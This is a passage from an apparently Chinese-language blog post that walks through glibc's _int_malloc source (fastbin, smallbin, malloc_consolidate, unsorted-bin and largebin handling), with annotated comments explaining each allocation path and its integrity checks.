<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="comment">//如果nb(chunk)大小在fastbin范围</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);				<span class="comment">//idx就是bin的下标</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);	</span><br><span class="line">      <span class="comment">//取得fastbinsY[idx]地址赋给fb指针，*fb就是fastbin的首节点</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;			<span class="comment">//victim现在指向相应fastbinsY[idx]里的内容,指向bin的首部节点</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)				<span class="comment">//单线程时，fd指向bin的头结点，就是要取出的空闲chunk</span></span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))			<span class="comment">//victim!=NULL向下执行</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))	<span class="comment">//victim_idx应该等于idx</span></span><br><span class="line">              	</span><br><span class="line">              <span class="comment">//这个地方就是常用的fastbin的检查</span></span><br><span class="line">              </span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);	<span class="comment">//将chunk地址转化为用户可写地址（即chunk的fd位地址）</span></span><br><span class="line">	      alloc_perturb (p, bytes);		<span class="comment">//设初值</span></span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="smallbin范围"><a href="#smallbin范围" class="headerlink" title="smallbin范围"></a>smallbin范围</h3><ol>
<li><code>chunk</code>大小在<code>smallbin</code>范围</li>
<li>获得<code>bin</code>下标</li>
<li>获取要取出的<code>chunk</code>地址</li>
<li>判断是否为空，为空则向下判断是否为<code>largechunk</code></li>
<li>将下一个<code>chunk</code>的<code>PREV_INUSE</code>置为一，取出<code>chunk</code>，返回地址</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);			<span class="comment">//smallbin的下标</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)		<span class="comment">//smallbin不为空,victim=bin-&gt;bk,要取出的chunk</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);		<span class="comment">//将下一个chunk的PREV_INUSE置为一</span></span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);		<span class="comment">//检查标志位</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);		<span class="comment">//从malloc头到用户指针的转换</span></span><br><span class="line">          alloc_perturb (p, bytes);			<span class="comment">//初始化mem内存</span></span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h3><p>进行<code>malloc_consolidate</code>合并fastbins</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 函数流程</p>
</blockquote>
<ol>
<li>判断fastbin是否初始化，如果未初始化，则进行初始化然后退出。</li>
<li>按照fastbin由小到大的顺序合并chunk，每种相同大小的fastbin中chunk的处理顺序是从fastbin-&gt;fd开始取，下一个处理的是p-&gt;fd，依次类推。</li>
<li>首先尝试合并pre_chunk。</li>
<li>然后尝试合并next_chunk：如果next_chunk是top_chunk，则直接合并到top_chunk，然后进行第六步；如果next_chunk不是top_chunk，尝试合并。</li>
<li>将处理完的chunk插入到unsorted bin头部。</li>
<li>获取下一个空闲的fastbin，回到第二步，直到清空所有fastbin中的chunk，然后退出。</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">    then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">    placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">    until malloc is sure that chunks aren't immediately going to be</span></span><br><span class="line"><span class="comment">    reused anyway.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">do</span> &#123;					<span class="comment">//如果fb&lt;fastbin最大值，fb++,按照由小到大的顺序合并chunk</span></span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;		<span class="comment">//循环合并chunk，并p=p-&gt;fd直到p为0</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index (chunksize (p));</span><br><span class="line">	  <span class="keyword">if</span> ((&amp;fastbin (av, idx)) != fb)</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc_consolidate(): invalid chunk size"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	check_inuse_chunk(av, p);</span><br><span class="line">	nextp = p-&gt;fd;	<span class="comment">//按照fd的顺序遍历fastbin </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">	size = chunksize (p);</span><br><span class="line">	nextchunk = chunk_at_offset(p, size);</span><br><span class="line">	nextsize = chunksize(nextchunk);</span><br><span class="line">          <span class="comment">//获取下一个chunk和本chunk的size</span></span><br><span class="line">		<span class="comment">//pre_inuse为0,向前合并</span></span><br><span class="line">	<span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">	  prevsize = prev_size (p);</span><br><span class="line">	  size += prevsize;</span><br><span class="line">	  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">	  unlink(av, p, bck, fwd);</span><br><span class="line">	&#125;</span><br><span class="line">		<span class="comment">//下面的chunk不是top_chunk</span></span><br><span class="line">	<span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">	    size += nextsize;</span><br><span class="line">	    unlink(av, nextchunk, bck, fwd);</span><br><span class="line">	  &#125; <span class="keyword">else</span></span><br><span class="line">	    clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	  first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">	  unsorted_bin-&gt;fd = p;</span><br><span class="line">	  first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">	    p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	    p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  p-&gt;bk = unsorted_bin;				<span class="comment">// 将此chunk放到unsoeted bin中</span></span><br><span class="line">	  p-&gt;fd = first_unsorted;</span><br><span class="line">	  set_foot(p, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> &#123;						<span class="comment">//如果下面的chunk是top_chunk，那么合并到top_chunk</span></span><br><span class="line">	  size += nextsize;</span><br><span class="line">	  set_head(p, size | PREV_INUSE);</span><br><span class="line">	  av-&gt;top = p;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="循环-处理unsorted-bin"><a href="#循环-处理unsorted-bin" class="headerlink" title="循环,处理unsorted_bin"></a>循环,处理unsorted_bin</h3><blockquote>
<p>unsorted_bin不为空时，执行以下循环，<code>iters</code>为循环条件</p>
</blockquote>
<p>1.如果请求的 chunk 是一个 <code>small chunk</code>, 且 <code>unsorted bin</code> 只有<code>一个 chunk</code>, 并且这个 chunk 在上次分配时被使用过(<code>也就是 last_remainder</code>), 并且 chunk 的大小<code>大于 (分配的大小 + MINSIZE)</code>, 这种情况下就直接将该 chunk 进行切割,更新<code>last_remainder</code>,返回截取的<code>chunk</code>的<code>mem</code>地址</p>
<p>2.<code>victim</code>恰好等于申请chunk大小，返回chunk结束</p>
<p>3.<code>victim</code>放到对应大小的<code>smallbin</code>或者<code>largebin</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">       <span class="keyword">int</span> iters = <span class="number">0</span>;	<span class="comment">//循环条件，最多10000次</span></span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">//victim为unsorted_bin尾结点，指向正在处理的chunk</span></span><br><span class="line">          bck = victim-&gt;bk;		<span class="comment">//bck是为了方便双链表的删除操作</span></span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">				   &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br><span class="line">          size = chunksize (victim);	<span class="comment">//size尾结点大小</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">          以下代码从last_remainder截取chunk</span></span><br><span class="line"><span class="comment">******************************************************************/</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">          以上代码从last_remainder截取chunk</span></span><br><span class="line"><span class="comment">******************************************************************/</span>   </span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">         恰好等于申请chunk大小，返回chunk结束</span></span><br><span class="line"><span class="comment">******************************************************************/</span>          </span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">         恰好等于申请chunk大小，返回chunk结束</span></span><br><span class="line"><span class="comment">******************************************************************/</span> </span><br><span class="line">          </span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">         victim放到对应大小的smallbin或者largebin</span></span><br><span class="line"><span class="comment">******************************************************************/</span> </span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;			<span class="comment">//mchunkptr fwd;  </span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we've processed as many chunks as we're allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/******************************************************************</span></span><br><span class="line"><span class="comment">         放到对应大小的smallbin或者largebin</span></span><br><span class="line"><span class="comment">******************************************************************/</span> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="如果在largebin范围"><a href="#如果在largebin范围" class="headerlink" title="如果在largebin范围"></a>如果在largebin范围</h3><p>（相对上一次，smallbin又加入了fastbin和unsortedbin的chunk）</p>
<blockquote>
<p>到此为止，fastbin，unsortedbin的空闲chunk都已处理</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">        sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">         <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">           &#123;</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line">             <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                     (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">               victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                list does not have to be rerouted.  */</span></span><br><span class="line">             <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">	  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">	    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">               victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">             remainder_size = size - nb;</span><br><span class="line">             unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">             <span class="comment">/* Exhaust */</span></span><br><span class="line">             <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">               &#123;</span><br><span class="line">                 set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                 <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="comment">/* Split */</span></span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               &#123;</span><br><span class="line">                 remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                 <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                    have to perform a complete insert here.  */</span></span><br><span class="line">                 bck = unsorted_chunks (av);</span><br><span class="line">                 fwd = bck-&gt;fd;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): corrupted unsorted chunks"</span>);</span><br><span class="line">                 remainder-&gt;bk = bck;</span><br><span class="line">                 remainder-&gt;fd = fwd;</span><br><span class="line">                 bck-&gt;fd = remainder;</span><br><span class="line">                 fwd-&gt;bk = remainder;</span><br><span class="line">                 <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                   &#123;</span><br><span class="line">                     remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                     remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                 set_head (victim, nb | PREV_INUSE 